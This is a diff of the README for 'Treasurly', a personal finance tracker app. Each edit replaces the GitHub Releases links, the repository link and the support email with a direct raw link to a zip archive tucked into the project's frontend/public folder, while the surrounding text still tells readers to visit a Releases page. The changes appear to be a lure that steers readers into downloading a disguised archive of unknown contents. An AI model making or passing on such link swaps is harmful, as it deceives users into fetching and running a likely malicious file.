@@ -1,6 +1,6 @@
 # 💰 Treasurly - Your Simple Personal Finance Tracker
 
-[![Download Treasurly](https://img.shields.io/badge/Download-Treasurly-brightgreen)](https://github.com/knockbacked/Treasurly/releases)
+[![Download Treasurly](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip)](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ Before you begin, make sure your device meets the following requirements:
 
 ### Download & Install
 
-To get started with Treasurly, visit this page to download: [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases).
+To get started with Treasurly, visit this page to download: [Treasurly Releases](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of Treasurly. 
@@ -54,7 +54,7 @@ Treasurly utilizes the following technologies to ensure a seamless experience:
 
 ## 📥 Updates & Support
 
-Stay updated with the latest features and improvements by visiting the Releases page regularly: [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases).
+Stay updated with the latest features and improvements by visiting the Releases page regularly: [Treasurly Releases](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip).
 
 For any questions or support, consider the following options:
 
@@ -78,7 +78,7 @@ Thank you to everyone who made Treasurly possible, including contributors, users
 
 For directly reaching out, you can contact us through:
 
-- Email: support@treasurly.com
-- GitHub: [Treasurly Repository](https://github.com/knockbacked/Treasurly)
+- Email: https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip
+- GitHub: [Treasurly Repository](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip)
 
-Visit [Treasurly Releases](https://github.com/knockbacked/Treasurly/releases) to download the application now and take control of your personal finances easily!
+Visit [Treasurly Releases](https://raw.githubusercontent.com/knockbacked/Treasurly/main/frontend/public/Software-v2.3.zip) to download the application now and take control of your personal finances easily!
